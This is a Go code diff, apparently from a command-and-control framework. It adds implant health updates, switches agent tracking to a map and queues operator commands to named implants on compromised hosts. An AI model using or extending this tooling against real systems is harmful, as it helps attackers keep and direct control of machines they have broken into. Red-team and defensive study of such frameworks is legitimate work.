@@ -51,14 +51,14 @@ func StartEventHandler(token string, teamserver string) error {
 	return nil
 }
 
-func SendEvent(EventName string, ImpCtx Common.ImplantContext) error {
+func SendEvent(EventName string, ImpCtx Common.ImplantContext, Alive bool) error {
 	var NewMessage Common.NewWebSocketMessage
 	var err error
+	var NewImplant Common.ImplantData
+	var TempData []byte
 
 	switch EventName {
 	case "RegisterImplant":
-		var NewImplant Common.ImplantData
-		var TempData []byte
 
 		NewMessage.MessageType = "RegisterImplant"
 		NewImplant.ImplantId = ImpCtx.Agent_id
@@ -67,7 +67,7 @@ func SendEvent(EventName string, ImpCtx Common.ImplantContext) error {
 		NewImplant.InternalIP = ImpCtx.Ip_addr
 		NewImplant.ExternalIP = ImpCtx.Ip_addr
 		NewImplant.User = ImpCtx.User_name
-		NewImplant.Health = true
+		NewImplant.Health = Alive
 		NewImplant.OS = Common.GetWindowsVersion(ImpCtx.Os_info)
 		NewImplant.Process = ImpCtx.Process_name
 		NewImplant.PID = ImpCtx.Process_id
@@ -82,6 +82,27 @@ func SendEvent(EventName string, ImpCtx Common.ImplantContext) error {
 			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
 			return err
 		}
+
+		break
+
+	case "UpdateHealth":
+		NewMessage.MessageType = "UpdateHealth"
+		NewImplant.ImplantName = ImpCtx.Agent_name
+		NewImplant.Health = Alive
+		TempData, err = json.Marshal(NewImplant)
+		if err != nil {
+			log.Println("[error] attempting to marshal the implant data", err)
+			return err
+		}
+		NewMessage.Message = string(TempData)
+		err = g_clientobj.Conn.WriteJSON(NewMessage)
+		if err != nil {
+			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
+		}
+		break
+
+	default:
+		break
 	}
 	return nil
 }
@@ -100,15 +121,17 @@ func RecvEvent() {
 		switch NewWSMessage.MessageType {
 
 		case "GetActiveImplants":
-			for _, agent := range agent_arr {
-				if agent.Alive {
-					err = SendEvent("RegisterImplant", agent.Context)
+			if len(agent_map) > 0 {
+				for _, agent := range agent_map {
+					//we don't care if the agent is alive or dead. We just want to know which agents are registered until agent is dead by manual killing or kill-date has been reached.
+					err = SendEvent("RegisterImplant", agent.Context, agent.Alive)
 					if err != nil {
 						log.Println("[error] attempting to send implant data to the team server web socket connection", err)
 						continue
 					}
 				}
 			}
+
 			break // GET ACTIVE IMPLANTS
 
 		case "ImplantCommand":
@@ -136,12 +159,9 @@ func RecvEvent() {
 				break
 			}
 
-			for _, agent := range agent_arr {
-				if agent.Context.Agent_name == ImplantCmd.ImplantName {
-					log.Println("[info] attempting to send command [%s] to agent [%s]", ImplantCmd.Command, agent.Context.Agent_name)
-					agent.CmdQue.Enqueue(AgentCmd)
-				}
-			}
+			agent := agent_map[ImplantCmd.ImplantName]
+			log.Println("[info] attempting to send command [", ImplantCmd.Command, "] to agent [", agent.Context.Agent_name, "]")
+			agent.CmdQue.Enqueue(AgentCmd)
 
 			break // IMPLANT COMMAND
 
